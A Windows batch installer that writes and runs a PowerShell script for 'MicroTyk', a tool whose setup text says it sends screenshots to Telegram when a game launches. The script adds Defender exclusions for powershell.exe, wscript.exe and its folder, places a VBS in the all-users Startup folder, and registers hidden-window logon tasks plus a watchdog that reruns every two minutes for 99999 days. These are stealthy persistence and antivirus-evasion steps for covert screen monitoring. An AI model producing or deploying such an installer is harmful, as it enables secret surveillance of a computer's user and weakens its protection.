@echo off
REM ============================================================
REM  MicroTyk Automatic Installer (ONE-CLICK)
REM  Right-click → Run as Administrator
REM ============================================================

setlocal enabledelayedexpansion

REM Check admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo.
  echo ERROR: This script requires Administrator rights
  echo Please: Right-click this file and select "Run as Administrator"
  echo.
  pause
  exit /b 1
)

cls
echo.
echo ========================================
echo   MicroTyk Installation (Automatic)
echo ========================================
echo.

REM Determine source directory
set "SCRIPTDIR=%~dp0"
if not exist "%SCRIPTDIR%MicroTyk.ps1" (
  echo ERROR: MicroTyk.ps1 not found in %SCRIPTDIR%
  echo Make sure all files are in the same folder as this batch file.
  pause
  exit /b 1
)

REM Create PowerShell script that will do the installation
set "PSSCRIPT=%TEMP%\MicroTyk-Install-Temp.ps1"

(
  echo # Auto-generated installation script
  echo $ErrorActionPreference = 'Stop'
  echo.
  echo Write-Host "========================================" -ForegroundColor Cyan
  echo Write-Host "MicroTyk Installation" -ForegroundColor Cyan
  echo Write-Host "========================================" -ForegroundColor Cyan
  echo Write-Host ""
  echo.
  echo # Paths
  echo $SourceDir = "%SCRIPTDIR%"
  echo $InstallDir = "C:\MicroTyk"
  echo $DataDir = "$env:LOCALAPPDATA\MicroTyk"
  echo.
  echo # Step 1: Create directories
  echo Write-Host "[1/6] Creating directories..." -ForegroundColor Yellow
  echo if ^(Test-Path $InstallDir^) { Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue }
  echo New-Item -ItemType Directory -Path $InstallDir -Force ^| Out-Null
  echo New-Item -ItemType Directory -Path $DataDir -Force ^| Out-Null
  echo Write-Host "  ✅ Created" -ForegroundColor Green
  echo Write-Host ""
  echo.
  echo # Step 2: Copy files
  echo Write-Host "[2/6] Copying files..." -ForegroundColor Yellow
  echo $files = @("MicroTyk.ps1", "GameWatch.ps1", "Watchdog.ps1", "MicroTyk.vbs", "config.ps1")
  echo foreach ($file in $files) {
  echo   $src = Join-Path $SourceDir $file
  echo   if (Test-Path $src) {
  echo     Copy-Item $src (Join-Path $InstallDir $file) -Force
  echo     Write-Host "    ✅ $file" -ForegroundColor Green
  echo   }
  echo }
  echo Write-Host ""
  echo.
  echo # Step 3: Add Defender exclusions
  echo Write-Host "[3/6] Adding Defender exclusions..." -ForegroundColor Yellow
  echo Add-MpPreference -ExclusionProcess "powershell.exe", "wscript.exe" -ErrorAction SilentlyContinue
  echo Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
  echo Write-Host "  ✅ Done" -ForegroundColor Green
  echo Write-Host ""
  echo.
  echo # Step 4: Create startup link
  echo Write-Host "[4/6] Creating startup link..." -ForegroundColor Yellow
  echo $startupDir = [Environment]::GetFolderPath('CommonStartup')
  echo Copy-Item (Join-Path $InstallDir "MicroTyk.vbs") (Join-Path $startupDir "MicroTyk.vbs") -Force
  echo Write-Host "  ✅ Done" -ForegroundColor Green
  echo Write-Host ""
  echo.
  echo # Step 5: Create scheduled tasks
  echo Write-Host "[5/6] Creating scheduled tasks..." -ForegroundColor Yellow
  echo $psPath = Get-Command powershell.exe ^| Select-Object -ExpandProperty Source
  echo.
  echo # MicroTyk task
  echo $taskName = "MicroTyk"
  echo $scriptPath = Join-Path $InstallDir "MicroTyk.ps1"
  echo $action = New-ScheduledTaskAction -Execute $psPath -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
  echo $trigger = New-ScheduledTaskTrigger -AtLogOn
  echo $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -StartWhenAvailable
  echo Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue ^| Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
  echo Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force ^| Out-Null
  echo Write-Host "    ✅ MicroTyk task" -ForegroundColor Green
  echo.
  echo # Watchdog task
  echo $watchdogName = "MicroTyk_Watchdog"
  echo $watchdogScript = Join-Path $InstallDir "Watchdog.ps1"
  echo $watchdogAction = New-ScheduledTaskAction -Execute $psPath -Argument "-NoProfile -WindowStyle Hidden -File `"$watchdogScript`""
  echo $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2)
  echo $watchdogSettings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew -StartWhenAvailable
  echo Get-ScheduledTask -TaskName $watchdogName -ErrorAction SilentlyContinue ^| Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
  echo Register-ScheduledTask -TaskName $watchdogName -Action $watchdogAction -Trigger $watchdogTrigger -Settings $watchdogSettings -Force ^| Out-Null
  echo try {
  echo   $taskXml = Get-ScheduledTask -TaskName $watchdogName ^| Export-ScheduledTask
  echo   $taskXml = $taskXml -replace '<Duration^>PT0S</Duration^>', '<Duration^>P99999D</Duration^>'
  echo   $taskXml ^| Register-ScheduledTask -TaskName $watchdogName -Force ^| Out-Null
  echo } catch { }
  echo Write-Host "    ✅ Watchdog task" -ForegroundColor Green
  echo Write-Host ""
  echo.
  echo # Step 6: Start MicroTyk
  echo Write-Host "[6/6] Starting MicroTyk..." -ForegroundColor Yellow
  echo Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -NoNewWindow
  echo Write-Host "  ✅ Started" -ForegroundColor Green
  echo Write-Host ""
  echo.
  echo Write-Host "========================================" -ForegroundColor Green
  echo Write-Host "Installation Complete!" -ForegroundColor Green
  echo Write-Host "========================================" -ForegroundColor Green
  echo Write-Host ""
  echo Write-Host "Next steps:" -ForegroundColor Cyan
  echo Write-Host "  1. Edit C:\MicroTyk\config.ps1 with your Telegram Token + ChatId" -ForegroundColor Gray
  echo Write-Host "  2. Restart MicroTyk (or wait for next login)" -ForegroundColor Gray
  echo Write-Host "  3. Launch a game - screenshot will arrive in Telegram" -ForegroundColor Gray
  echo Write-Host ""
  echo Write-Host "Config file: C:\MicroTyk\config.ps1" -ForegroundColor Yellow
  echo Write-Host "Telegram setup: https://github.com/vertedasdsa/gamewatch/blob/main/SETUP-Telegram.md" -ForegroundColor Yellow
  echo Write-Host ""
  echo pause
) > "%PSSCRIPT%"

REM Run PowerShell script
echo Running installation...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -File "%PSSCRIPT%"
set "INSTALL_RESULT=%ERRORLEVEL%"

REM Cleanup
del /f /q "%PSSCRIPT%" 2>nul

if %INSTALL_RESULT% neq 0 (
  echo.
  echo ERROR: Installation failed with code %INSTALL_RESULT%
  pause
  exit /b %INSTALL_RESULT%
)

echo.
echo Installation finished successfully!
echo.
pause
exit /b 0
